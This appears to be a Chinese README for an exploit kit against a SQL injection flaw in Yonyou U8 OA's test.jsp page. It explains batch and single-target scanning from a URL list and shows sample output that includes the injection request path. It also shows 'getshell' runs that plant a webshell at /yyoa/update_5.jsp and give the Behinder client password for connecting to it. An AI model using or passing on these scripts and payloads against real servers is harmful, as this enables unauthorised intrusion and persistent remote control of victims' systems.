# 用友 U8 OA test.jsp SQL注入漏洞

## 使用方法

### 1.批量url检测

url.txt格式如下:

```
http://www.xxx.com
xxx.xxx.xxx.xxx:8080
www.xxx.com
```

#### 漏洞验证脚本
```
python3 poc.py
+------------------------------------------
+  Version:  用友 U8 OA test.jsp SQL注入漏洞
+  使用格式:  python3 poc.py
+  文件名:    url.txt
+------------------------------------------
请输入需要检测的文件名：url.txt
```

#### 漏洞利用(getshell)脚本

```
python3 getshell_poc.py
+------------------------------------------
+  Version:  用友 U8 OA test.jsp SQL注入漏洞
+  使用格式:  python3 getshell_poc.py
+  文件名:    url.txt
+------------------------------------------
请输入需要检测的文件名：url.txt
```

### 2.单个url检测

#### 漏洞验证脚本

```
python3 exp.py
+------------------------------------------
+  Version:  用友 U8 OA test.jsp SQL注入漏洞
+  使用格式:  python3 exp.py
+  url地址:  http://xxx.xxx.xxx.xxx
+------------------------------------------
请输入需要检测的url：http://xxx.xxx.xxx.xxx
[+]目标 http://xxx.xxx.xxx.xxx 存在漏洞
[+] 响应地址: http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))
```
#### 漏洞利用(getshell)脚本

```
➜  用友U8_OA_SQL注入 python3 getshell_exp.py
+------------------------------------------
+  Version:     用友 U8 OA test.jsp SQL注入漏洞
+  使用格式:    python3 getshell_exp.py
+  URL地址:     http://xxx.xxx.xxx.xxx
+------------------------------------------
请输入需要检测的URL地址：http://xxx.xxx.xxx.xxx
[+]目标 http://xxx.xxx.xxx.xxx 存在SQL注入漏洞
[+]文件写入木马上传成功，上传路径为 http://xxx.xxx.xxx.xxx/yyoa/update_5.jsp
[+]请使用冰蝎连接，密码为: bxmm
```
